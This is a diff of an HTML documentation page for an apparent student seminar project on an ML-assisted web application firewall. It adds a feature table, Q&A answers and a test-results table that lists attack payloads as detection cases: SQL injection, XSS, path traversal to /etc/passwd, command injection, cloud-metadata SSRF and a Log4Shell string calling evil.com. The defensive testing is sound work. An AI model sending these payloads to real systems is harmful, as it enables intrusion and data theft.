-                <tr><td class="p-2.5 font-mono text-slate-500">2</td><td class="p-2.5 font-mono text-cyber-accent">special_char_ratio</td><td class="p-2.5">float</td><td class="p-2.5">สัดส่วนอักขระพิเศษต่อความยาวรวม เพื่อ Normalize ข้อมูล</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">1</td><td class="p-2.5 font-mono text-cyber-accent">special_char_count</td><td class="p-2.5">int</td><td class="p-2.5">นับอักขระอันตราย (<code>' " ; < > \ $ ( ) | ` ^ ~ * # { } [ ]</code>) โดยไม่นับเครื่องหมาย URL ปกติ (<code>= & ? / - _ + . @</code>) เพื่อไม่ให้ Search Query ปกติติด False Positive</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">2</td><td class="p-2.5 font-mono text-cyber-accent">special_char_ratio</td><td class="p-2.5">float</td><td class="p-2.5">สัดส่วนอักขระพิเศษต่อความยาวรวม เพื่อ Normalize ข้อมูล ไม่ให้เกิด Path-Length Bias</td></tr>
                 <tr><td class="p-2.5 font-mono text-slate-500">3</td><td class="p-2.5 font-mono text-cyber-accent">keyword_matches</td><td class="p-2.5">int</td><td class="p-2.5">ตรวจจับ Attack Keywords (SQLi, XSS, RCE, SSRF, SSTI, NoSQL, Log4j)</td></tr>
                 <tr><td class="p-2.5 font-mono text-slate-500">4</td><td class="p-2.5 font-mono text-cyber-accent">html_tag_matches</td><td class="p-2.5">int</td><td class="p-2.5">ตรวจจับโครงสร้างแท็ก HTML (<code>&lt;script&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;iframe&gt;</code>) สำหรับ XSS</td></tr>
                 <tr><td class="p-2.5 font-mono text-slate-500">5</td><td class="p-2.5 font-mono text-cyber-accent">path_traversal_depth</td><td class="p-2.5">int</td><td class="p-2.5">นับความลึกของการย้อนโฟลเดอร์ (<code>../</code>, <code>..\</code>, <code>..%2f</code>) สำหรับ LFI/RFI</td></tr>
                 <tr><td class="p-2.5 font-mono text-slate-500">6</td><td class="p-2.5 font-mono text-cyber-accent">quote_unbalanced</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Quote เดี่ยวหรือคู่ที่ไม่ครบคู่ (Sign of SQLi Injection Breakout)</td></tr>
-                <tr><td class="p-2.5 font-mono text-slate-500">7</td><td class="p-2.5 font-mono text-cyber-accent">has_sql_operator</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Boolean & Set Operator (<code>UNION SELECT</code>, <code>' OR '1'='1</code>)</td></tr>
-                <tr><td class="p-2.5 font-mono text-slate-500">8</td><td class="p-2.5 font-mono text-cyber-accent">has_ssrf_token</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Cloud Metadata SSRF (<code>169.254.169.254</code>, <code>metadata.google</code>)</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">7</td><td class="p-2.5 font-mono text-cyber-accent">has_sql_operator</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Boolean & Set Operator ของ SQL (<code>UNION SELECT</code>, <code>' OR '1'='1</code>, <code>' AND 1=1</code>)</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">8</td><td class="p-2.5 font-mono text-cyber-accent">has_ssrf_token</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Cloud Metadata SSRF Token (<code>169.254.169.254</code>, <code>metadata.google</code>)</td></tr>
                 <tr><td class="p-2.5 font-mono text-slate-500">9</td><td class="p-2.5 font-mono text-cyber-accent">has_ssti_nosql</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Template Injection และ NoSQL (<code>{{...}}</code>, <code>$ne</code>, <code>$gt</code>, <code>${jndi:</code>)</td></tr>
-                <tr><td class="p-2.5 font-mono text-slate-500">10</td><td class="p-2.5 font-mono text-cyber-accent">is_oversized_payload</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Request ยาวผิดปกติ (> 2048 bytes) กัน Buffer Overflow</td></tr>
-                <tr><td class="p-2.5 font-mono text-slate-500">11</td><td class="p-2.5 font-mono text-cyber-accent">is_clean_structure</td><td class="p-2.5">binary</td><td class="p-2.5">แฟล็กยืนยันว่า Request สะอาด ไม่มีอักขระโจมตีใดๆ เพื่อลด False Positive</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">10</td><td class="p-2.5 font-mono text-cyber-accent">is_oversized_payload</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Request ยาวผิดปกติ (> 2048 bytes) เพื่อกัน Buffer Overflow</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">11</td><td class="p-2.5 font-mono text-cyber-accent">is_clean_structure</td><td class="p-2.5">binary</td><td class="p-2.5">แฟล็กยืนยันว่า Request สะอาด ไม่มีอักขระโจมตีใดๆ เพื่อลด False Positive ของหน้าเว็บทั่วไป</td></tr>
                 <tr><td class="p-2.5 font-mono text-slate-500">12</td><td class="p-2.5 font-mono text-cyber-accent">has_excessive_params</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ Parameter ล้น (> 10 ตัว) สำหรับ HTTP Parameter Pollution</td></tr>
-                <tr><td class="p-2.5 font-mono text-slate-500">13</td><td class="p-2.5 font-mono text-cyber-accent">method_is_post</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับ HTTP POST Method</td></tr>
+                <tr><td class="p-2.5 font-mono text-slate-500">13</td><td class="p-2.5 font-mono text-cyber-accent">method_is_post</td><td class="p-2.5">binary</td><td class="p-2.5">ตรวจจับว่า Request ใช้ HTTP POST Method หรือไม่</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Empirical Test Results Table -->
+        <div class="glass-card rounded-2xl p-6 space-y-4">
+          <h3 class="font-bold text-base text-white flex items-center gap-2">
+            <i data-lucide="check-circle" class="w-5 h-5 text-emerald-400"></i> 4.3 ผลการทดสอบเชิงประจักษ์ 16 หมวดหมู่ (Empirical Test Results)
+          </h3>
+          <div class="overflow-x-auto">
+            <table class="w-full text-xs text-left border-collapse">
+              <thead>
+                <tr class="bg-slate-900 border-b border-cyber-border text-slate-300">
+                  <th class="p-2.5">#</th>
+                  <th class="p-2.5">กรณีทดสอบ (Scenario)</th>
+                  <th class="p-2.5">URI / Payload</th>
+                  <th class="p-2.5 text-center">ความน่าจะเป็น</th>
+                  <th class="p-2.5 text-center">ผลการทำนาย</th>
+                  <th class="p-2.5">สถานะ</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-cyber-border text-slate-300 font-mono">
+                <tr><td class="p-2.5">1</td><td class="p-2.5 font-sans">Normal Home Page</td><td class="p-2.5">GET /index.html</td><td class="p-2.5 text-center text-emerald-400">24.8%</td><td class="p-2.5 text-center text-emerald-400 font-bold">PASS (Normal)</td><td class="p-2.5 font-sans text-emerald-400">✅ ถูกต้อง</td></tr>
+                <tr><td class="p-2.5">2</td><td class="p-2.5 font-sans">Normal REST API</td><td class="p-2.5">GET /api/v1/users/123</td><td class="p-2.5 text-center text-emerald-400">24.8%</td><td class="p-2.5 text-center text-emerald-400 font-bold">PASS (Normal)</td><td class="p-2.5 font-sans text-emerald-400">✅ ถูกต้อง</td></tr>
+                <tr><td class="p-2.5">3</td><td class="p-2.5 font-sans">Normal Search Query</td><td class="p-2.5">GET /search?q=laptop&page=2</td><td class="p-2.5 text-center text-emerald-400">24.8%</td><td class="p-2.5 text-center text-emerald-400 font-bold">PASS (Normal)</td><td class="p-2.5 font-sans text-emerald-400">✅ ถูกต้อง</td></tr>
+                <tr><td class="p-2.5">4</td><td class="p-2.5 font-sans">Normal Login Form</td><td class="p-2.5">POST /login (user=john&pass=P@ss)</td><td class="p-2.5 text-center text-emerald-400">42.7%</td><td class="p-2.5 text-center text-emerald-400 font-bold">PASS (Normal)</td><td class="p-2.5 font-sans text-emerald-400">✅ ถูกต้อง</td></tr>
+                <tr><td class="p-2.5">5</td><td class="p-2.5 font-sans text-red-400 font-bold">SQLi Auth Bypass</td><td class="p-2.5">GET /login?user=admin' OR '1'='1' --</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">6</td><td class="p-2.5 font-sans text-red-400 font-bold">SQLi UNION Extraction</td><td class="p-2.5">GET /products?cat=1 UNION SELECT 1,pass FROM u--</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">7</td><td class="p-2.5 font-sans text-red-400 font-bold">Reflected XSS</td><td class="p-2.5">GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">8</td><td class="p-2.5 font-sans text-red-400 font-bold">Path Traversal / LFI</td><td class="p-2.5">GET /download?file=../../../../etc/passwd</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">9</td><td class="p-2.5 font-sans text-red-400 font-bold">Command Injection (RCE)</td><td class="p-2.5">POST /api/exec (cmd=cat${IFS}/etc/passwd)</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">10</td><td class="p-2.5 font-sans text-red-400 font-bold">SSRF Cloud Metadata</td><td class="p-2.5">GET /fetch?url=http://169.254.169.254/meta-data</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">11</td><td class="p-2.5 font-sans text-red-400 font-bold">SSTI Jinja2 Injection</td><td class="p-2.5">GET /view?tpl={{7*7}}</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">12</td><td class="p-2.5 font-sans text-red-400 font-bold">NoSQL Injection</td><td class="p-2.5">POST /auth ({"user": {"$ne": null}})</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
+                <tr><td class="p-2.5">13</td><td class="p-2.5 font-sans text-red-400 font-bold">Log4Shell Exploit</td><td class="p-2.5">GET /search?q=${jndi:ldap://evil.com/a}</td><td class="p-2.5 text-center text-red-400 font-bold">100.0%</td><td class="p-2.5 text-center text-red-400 font-bold">ANOMALY DETECTED</td><td class="p-2.5 font-sans text-red-400">🚨 สกัดกั้นสำเร็จ</td></tr>
               </tbody>
             </table>
           </div>
         </div>
       </section>
 
-      <!-- MODULE 3: MODSECURITY & OWASP CRS -->
+      <!-- MODULE 5: MODSECURITY & BLAST RADIUS SIMULATOR -->
       <section id="module-modsec" class="space-y-6 pt-4">
         <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
           <div class="p-2 rounded-xl bg-cyber-red/10 text-cyber-red">
             <i data-lucide="shield-alert" class="w-6 h-6"></i>
           </div>
           <div>
-            <h2 class="text-2xl font-bold text-white">3. Layer 1: ModSecurity & OWASP Core Rule Set (CRS v4.0)</h2>
-            <p class="text-sm text-slate-400">ระบบ In-line Fast Path Inspection, Anomaly Scoring Model และการสร้างกฎอัตโนมัติ</p>
+            <h2 class="text-2xl font-bold text-white">5. Layer 1: ModSecurity CRS v4.0 & Blast Radius Simulator</h2>
+            <p class="text-sm text-slate-400">ระบบ In-line Fast Path Inspection, Anomaly Scoring Model และการทดสอบ Dry-run ก่อน Deploy</p>
           </div>
         </div>
 
@@ -413,7 +687,7 @@ flowchart TD
               <i data-lucide="code-2" class="w-4 h-4 text-cyber-accent"></i> Auto-Generated SecRule Sample
             </h4>
             <p class="text-xs text-slate-300 leading-relaxed">
-              เมื่อโมเดล ML ตรวจพบภัยคุกคามใหม่ ระบบจะสร้าง ModSecurity Rule ที่ถูกต้องตามหลักไวยากรณ์ Apache SecRule โดยอัตโนมัติ:
+              เมื่อโมเดล ML ตรวจพบภัยคุกคามใหม่ ฟังก์ชัน <code>auto_rule_generator.py</code> จะสร้าง ModSecurity Rule ที่ถูกต้องตามหลักไวยากรณ์ Apache SecRule โดยอัตโนมัติ:
             </p>
             <pre class="bg-slate-950 p-3 rounded-lg font-mono text-[11px] text-brand-400 border border-slate-800 overflow-x-auto">
 SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)or\s+['\"]?1['\"]?\s*=\s*['\"]?1" \
@@ -428,14 +702,14 @@ SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)or\s+['\"]?1['\"]?\s*=\s*['\"]?1" \
         </div>
       </section>
 
-      <!-- MODULE 4: EDGE CDN & GEODNS -->
+      <!-- MODULE 6: EDGE CDN & GEODNS -->
       <section id="module-edge-cdn" class="space-y-6 pt-4">
         <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
           <div class="p-2 rounded-xl bg-cyber-emerald/10 text-cyber-emerald">
             <i data-lucide="globe" class="w-6 h-6"></i>
           </div>
           <div>
-            <h2 class="text-2xl font-bold text-white">4. Global Edge CDN & GeoDNS Subsystem</h2>
+            <h2 class="text-2xl font-bold text-white">6. Global Edge CDN & GeoDNS Subsystem</h2>
             <p class="text-sm text-slate-400">ระบบกระจายทราฟฟิกตามพิกัดภูมิศาสตร์, การเข้ารหัส SSL, และ Caching Rules</p>
           </div>
         </div>
@@ -470,14 +744,14 @@ SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)or\s+['\"]?1['\"]?\s*=\s*['\"]?1" \
         </div>
       </section>
 
-      <!-- MODULE 5: STREAM ANALYTICS & CLICKHOUSE -->
+      <!-- MODULE 7: STREAM ANALYTICS & CLICKHOUSE -->
       <section id="module-analytics" class="space-y-6 pt-4">
         <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
           <div class="p-2 rounded-xl bg-amber-400/10 text-amber-400">
             <i data-lucide="activity" class="w-6 h-6"></i>
           </div>
           <div>
-            <h2 class="text-2xl font-bold text-white">5. Multi-Channel Stream Analytics & ClickHouse Storage</h2>
+            <h2 class="text-2xl font-bold text-white">7. Multi-Channel Stream Analytics & ClickHouse Storage</h2>
             <p class="text-sm text-slate-400">การดักฟัง Log 4 ช่องทางพร้อมกันแบบ Real-time และการจัดเก็บแบบ Columnar</p>
           </div>
         </div>
@@ -495,14 +769,14 @@ SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)or\s+['\"]?1['\"]?\s*=\s*['\"]?1" \
         </div>
       </section>
 
-      <!-- MODULE 6: GENAI SECOPS & ADVANCED PROTECTION -->
+      <!-- MODULE 8: GENAI SECOPS & ADVANCED PROTECTION -->
       <section id="module-genai" class="space-y-6 pt-4">
         <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
           <div class="p-2 rounded-xl bg-indigo-400/10 text-indigo-400">
             <i data-lucide="sparkles" class="w-6 h-6"></i>
           </div>
           <div>
-            <h2 class="text-2xl font-bold text-white">6. Generative AI SecOps Lead & Advanced Protection</h2>
+            <h2 class="text-2xl font-bold text-white">8. Generative AI SecOps Lead & Advanced Protection</h2>
             <p class="text-sm text-slate-400">การวิเคราะห์สรุปเหตุการณ์ด้วย Google Gemini AI, BOLA Guard, และ Safe Regex Engine</p>
           </div>
         </div>
@@ -510,7 +784,7 @@ SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)or\s+['\"]?1['\"]?\s*=\s*['\"]?1" \
         <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
           <div class="glass-card rounded-xl p-4 space-y-2">
             <div class="font-bold text-indigo-400 flex items-center gap-1.5"><i data-lucide="bot" class="w-4 h-4"></i> Gemini AI Analyst</div>
-            <p class="text-slate-400">สรุปการโจมตีภาษาไทย 1-2 ประโยคสั้นๆ สำหรับทีม SecOps และแปลงคำถามเวลาธรรมชาติเป็น SQL Query</p>
+            <p class="text-slate-400">สรุปการโจมตีภาษาไทย 1-2 ประโยคสั้นๆ สำหรับทีม SecOps และแปลงคำถามเวลาธรรมชาติเป็น Time Range</p>
           </div>
           <div class="glass-card rounded-xl p-4 space-y-2">
             <div class="font-bold text-amber-400 flex items-center gap-1.5"><i data-lucide="lock" class="w-4 h-4"></i> BOLA Guard (API Security)</div>
@@ -523,14 +797,73 @@ SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)or\s+['\"]?1['\"]?\s*=\s*['\"]?1" \
         </div>
       </section>
 
-      <!-- MODULE 7: INTERACTIVE TEST SANDBOX -->
+      <!-- MODULE 9: SEMINAR Q&A & TECHNICAL DEFENSE -->
+      <section id="module-qa" class="space-y-6 pt-4">
+        <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
+          <div class="p-2 rounded-xl bg-amber-400/10 text-amber-400">
+            <i data-lucide="help-circle" class="w-6 h-6"></i>
+          </div>
+          <div>
+            <h2 class="text-2xl font-bold text-white">9. ประเด็นสำคัญและแนวทางการตอบคำถามสัมมนา (Seminar Presentation Q&A)</h2>
+            <p class="text-sm text-slate-400">คู่มือตอบคำถามเชิงลึกสำหรับกรรมการและผู้ฟังในการนำเสนอโปรเจกต์สัมมนา</p>
+          </div>
+        </div>
+
+        <div class="space-y-4">
+          <!-- Q1 -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <h4 class="font-bold text-sm text-cyber-accent flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-cyber-accent/20 text-cyber-accent flex items-center justify-center text-xs">Q1</span>
+              ทำไม Accuracy 80.5% ถึงดีกว่า 94% เดิม?
+            </h4>
+            <p class="text-xs text-slate-300 leading-relaxed pl-8">
+              <strong>ตอบ:</strong> ตัวเลข 94% เดิมเกิดจาก <em>Data Leakage</em> ที่มีการคูณข้อมูลซ้ำ 500 เท่า ทำให้ Test Set ซ้ำกับ Train Set (โมเดลท่องจำตัวอย่างเดิม) ส่วน 80.5% นี้เป็นการทดสอบบน <strong>Unseen Holdout Test Data ที่ไม่ซ้ำกัน 100%</strong> และมี <strong>Benign Recall สูงถึง 98.97%</strong> (False Alarm เพียง 1.03%) ซึ่งเป็นตัวเลขที่สะท้อนประสิทธิภาพจริงและใช้งานได้ในระบบ Production โดยไม่บล็อกผู้ใช้ทั่วไป
+            </p>
+          </div>
+
+          <!-- Q2 -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <h4 class="font-bold text-sm text-cyber-purple flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-cyber-purple/20 text-cyber-purple flex items-center justify-center text-xs">Q2</span>
+              ทำไมจึงต้องใช้ทั้ง Random Forest และ Isolation Forest ร่วมกัน?
+            </h4>
+            <p class="text-xs text-slate-300 leading-relaxed pl-8">
+              <strong>ตอบ:</strong> <em>Random Forest (Supervised)</em> ให้ความแม่นยำสูงมากกับ Known Attack Patterns ที่มี Signature ชัดเจน (เช่น SQLi, XSS) ส่วน <em>Isolation Forest (Unsupervised)</em> จะเรียนรู้เฉพาะ Normal Traffic Distribution เพื่อช่วยตรวจจับพฤติกรรมผิดปกติที่ไม่เคยพบมาก่อน (Zero-Day Anomaly Detection) การผสานแบบ Ensemble จึงครอบคลุมภัยคุกคามได้สมบูรณ์แบบ
+            </p>
+          </div>
+
+          <!-- Q3 -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <h4 class="font-bold text-sm text-brand-400 flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-brand-500/20 text-brand-400 flex items-center justify-center text-xs">Q3</span>
+              ทำไม ML ไม่นำไปขวางทราฟฟิกตรงๆ (In-line) แต่ทำเป็น Microservice?
+            </h4>
+            <p class="text-xs text-slate-300 leading-relaxed pl-8">
+              <strong>ตอบ:</strong> เพื่อรักษา <strong>High Throughput และ Low Latency (&lt; 2ms)</strong> ของ Edge WAF โดยให้ ModSecurity CRS ตรวจจับแบบเร็วใน In-line Fast Path และส่ง Request ผ่าน Stream Logging / Async Microservice ให้ ML วิเคราะห์เชิงลึกและสร้างกฎใหม่ (Auto Rule Generation) โดยไม่ทำให้ Server และผู้ใช้งานต้องรอโมเดลประมวลผล
+            </p>
+          </div>
+
+          <!-- Q4 -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <h4 class="font-bold text-sm text-yellow-400 flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-yellow-500/20 text-yellow-400 flex items-center justify-center text-xs">Q4</span>
+              ถ้ามี Attack Payload ยาวมากหรือผ่าน Encoding มา ML จะตรวจจับได้อย่างไร?
+            </h4>
+            <p class="text-xs text-slate-300 leading-relaxed pl-8">
+              <strong>ตอบ:</strong> ระบบทำ <strong>Double URL Decoding</strong> ก่อนส่งเข้า Feature Extractor เสมอ และมีฟีเจอร์ตรวจจับ Entropy, Special Character Ratio, และความยาวผิดปกติ (<code>is_oversized_payload</code>) ทำให้ตรวจจับเทคนิค Evasion และ Obfuscation ได้ครบถ้วน
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- MODULE 10: INTERACTIVE TEST SANDBOX -->
       <section id="module-sandbox" class="space-y-6 pt-4">
         <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
           <div class="p-2 rounded-xl bg-brand-500/10 text-brand-400">
             <i data-lucide="play-circle" class="w-6 h-6"></i>
           </div>
           <div>
-            <h2 class="text-2xl font-bold text-white">7. Interactive Threat Simulator & Live Feature Extractor</h2>
+            <h2 class="text-2xl font-bold text-white">10. Interactive Threat Simulator & Live Feature Extractor</h2>
             <p class="text-sm text-slate-400">ทดลองพิมพ์ URL หรือ Payload โจมตี เพื่อจำลองการสกัด 13 Features และคำนวณผลการทำนายแบบ Real-time</p>
           </div>
         </div>
